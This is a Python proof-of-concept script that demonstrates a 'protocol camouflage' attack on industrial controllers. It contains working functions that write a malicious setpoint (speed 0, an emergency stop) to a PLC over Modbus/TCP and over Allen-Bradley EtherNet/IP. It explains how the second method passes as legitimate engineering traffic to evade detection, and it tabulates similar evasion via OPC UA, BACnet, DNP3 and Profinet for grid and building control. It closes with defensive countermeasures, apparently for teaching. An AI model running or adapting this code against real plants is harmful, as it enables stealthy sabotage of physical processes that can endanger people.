#!/usr/bin/env python3
"""
Proof of Concept: Protocol Camouflage Attack
Demonstrates using legitimate protocols to evade detection
Makes malicious activity appear as normal engineering operations
"""

import time

from pylogix import PLC
from pymodbus.client import ModbusTcpClient


def evasive_plc_write(ip, tag, value):
    """
    Use legitimate PLC communication library (pylogix)
    Traffic looks identical to normal engineering operations

    This uses the same protocol as RSLogix/Studio 5000, so:
    - Logs show: "Engineering software wrote to tag"
    - NOT: "Suspicious Modbus write detected"
    - Blends with legitimate maintenance activity
    """
    print(f"[*] Evasive write to {ip}")
    print(f"    Tag: {tag}")
    print(f"    Value: {value}")
    print("    Method: Allen-Bradley EtherNet/IP (legitimate protocol)")

    try:
        with PLC() as comm:
            comm.IPAddress = ip
            result = comm.Write(tag, value)

            if result.Status == "Success":
                print("    [✓] Write successful")
                print("    Detection signature: Legitimate engineering software")
                return True
            else:
                print(f"    [!] Write failed: {result.Status}")
                return False

    except Exception as e:
        print(f"    [!] Error: {e}")
        print("    Note: This requires an Allen-Bradley PLC with EtherNet/IP")
        return False


def suspicious_modbus_write(ip, register, value):
    """
    Standard Modbus write - more likely to be flagged as suspicious
    Raw protocol commands stand out in network traffic
    """
    print(f"\n[*] Standard Modbus write to {ip}")
    print(f"    Register: {register}")
    print(f"    Value: {value}")
    print("    Method: Raw Modbus/TCP")

    client = ModbusTcpClient(ip, port=502)

    if not client.connect():
        print("    [!] Connection failed")
        return False

    try:
        result = client.write_register(register, value)

        if not result.isError():
            print("    [✓] Write successful")
            print("    Detection signature: Raw Modbus command (suspicious)")
            return True
        else:
            print("    [!] Write failed")
            return False

    finally:
        client.close()


def compare_attack_methods():
    """
    Demonstrate difference between suspicious and evasive attacks
    """
    print("=" * 70)
    print("[*] Proof of Concept: Protocol Camouflage")
    print("[*] Comparing suspicious vs. evasive attack methods")
    print("=" * 70 + "\n")

    target_ip = "192.168.10.10"
    malicious_value = 0  # Emergency stop

    print("[*] SCENARIO: Attacker wants to trigger emergency stop")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Malicious action: Set speed to {malicious_value} RPM\n")

    # Method 1: Suspicious (Raw Modbus)
    print("-" * 70)
    print("[*] METHOD 1: Raw Modbus Attack (HIGH detection probability)")
    print("-" * 70)
    suspicious_modbus_write(target_ip, 1000, malicious_value)

    print("\n    Detection characteristics:")
    print("    • Raw Modbus/TCP commands in network traffic")
    print("    • No authentication or session management")
    print("    • Unusual source IP or timing")
    print("    • IDS signatures for Modbus anomalies")
    print("    • Lacks legitimate engineering software fingerprint")

    time.sleep(1)

    # Method 2: Evasive (Legitimate Protocol)
    print("\n" + "-" * 70)
    print("[*] METHOD 2: Camouflaged Attack (LOW detection probability)")
    print("-" * 70)
    evasive_plc_write(target_ip, "SpeedSetpoint", malicious_value)

    print("\n    Detection evasion characteristics:")
    print("    • Uses Allen-Bradley EtherNet/IP protocol")
    print("    • Identical to RSLogix/Studio 5000 traffic")
    print("    • Includes proper session management")
    print("    • Tagged data access (not raw registers)")
    print("    • Appears as legitimate engineering work")
    print("    • May include valid engineering credentials")

    # Summary
    print("\n" + "=" * 70)
    print("[*] DETECTION COMPARISON")
    print("=" * 70)

    comparison = [
        {
            "aspect": "Network signature",
            "suspicious": "Raw Modbus function codes",
            "evasive": "Legitimate vendor protocol",
        },
        {
            "aspect": "Authentication",
            "suspicious": "None (Modbus has no auth)",
            "evasive": "May use stolen credentials",
        },
        {
            "aspect": "Session handling",
            "suspicious": "Simple connect/write/close",
            "evasive": "Full session management",
        },
        {
            "aspect": "IDS detection",
            "suspicious": "HIGH - triggers anomaly rules",
            "evasive": "LOW - looks legitimate",
        },
        {
            "aspect": "Log appearance",
            "suspicious": '"Unauthorized Modbus write"',
            "evasive": '"Engineer modified setpoint"',
        },
        {
            "aspect": "Investigation",
            "suspicious": "Immediately suspicious",
            "evasive": "Requires credential audit",
        },
    ]

    print(f"\n{'Aspect':<20} {'Suspicious Method':<30} {'Evasive Method':<30}")
    print("-" * 82)
    for item in comparison:
        print(f"{item['aspect']:<20} {item['suspicious']:<30} {item['evasive']:<30}")

    print("\n[*] REAL-WORLD EXAMPLES:")
    print("    • Stuxnet used legitimate Siemens Step 7 protocols")
    print("    • TRITON/TRISIS mimicked Schneider Electric software")
    print("    • Attackers steal engineering workstation credentials")
    print("    • VPN access from compromised engineering laptops")

    print("\n[*] DEFENSIVE COUNTERMEASURES:")
    print("    • Monitor ALL PLC writes, even from legitimate tools")
    print("    • Implement change management for setpoint modifications")
    print("    • Use multi-factor authentication for engineering access")
    print("    • Log who/when/what for every configuration change")
    print("    • Baseline normal engineering activity patterns")
    print("    • Require approval workflow for critical changes")
    print("    • Use hardware tokens for engineering software")
    print("    • Segregate engineering network from production")

    print("\n" + "=" * 70)


def demonstrate_additional_camouflage():
    """Show other protocol camouflage techniques"""

    print("\n" + "=" * 70)
    print("[*] ADDITIONAL CAMOUFLAGE TECHNIQUES")
    print("=" * 70)

    techniques = [
        {
            "protocol": "OPC UA",
            "legitimate_use": "SCADA data collection",
            "malicious_use": "Read/write industrial data",
            "evasion": "Encrypted, looks like normal SCADA traffic",
        },
        {
            "protocol": "BACnet",
            "legitimate_use": "Building automation",
            "malicious_use": "Manipulate HVAC, access control",
            "evasion": "Common in facilities, rarely monitored",
        },
        {
            "protocol": "DNP3",
            "legitimate_use": "Utility SCADA communications",
            "malicious_use": "Grid manipulation, substation control",
            "evasion": "Expected in power systems",
        },
        {
            "protocol": "Profinet",
            "legitimate_use": "Siemens PLC communications",
            "malicious_use": "Siemens PLC manipulation",
            "evasion": "Identical to TIA Portal traffic",
        },
        {
            "protocol": "EtherNet/IP",
            "legitimate_use": "Rockwell/Allen-Bradley comms",
            "malicious_use": "ControlLogix/CompactLogix control",
            "evasion": "Same as RSLogix software",
        },
    ]

    print(
        f"\n{'Protocol':<15} {'Legitimate Use':<30} {'Malicious Use':<30} {'Evasion Method'}"
    )
    print("-" * 120)
    for t in techniques:
        print(
            f"{t['protocol']:<15} {t['legitimate_use']:<30} {t['malicious_use']:<30} {t['evasion']}"
        )

    print("\n[*] KEY INSIGHT:")
    print("    Attackers don't need to use 'hacking tools'")
    print("    They use the SAME TOOLS as legitimate engineers")
    print("    This makes detection extremely difficult")
    print("\n" + "=" * 70)


if __name__ == "__main__":
    compare_attack_methods()
    demonstrate_additional_camouflage()
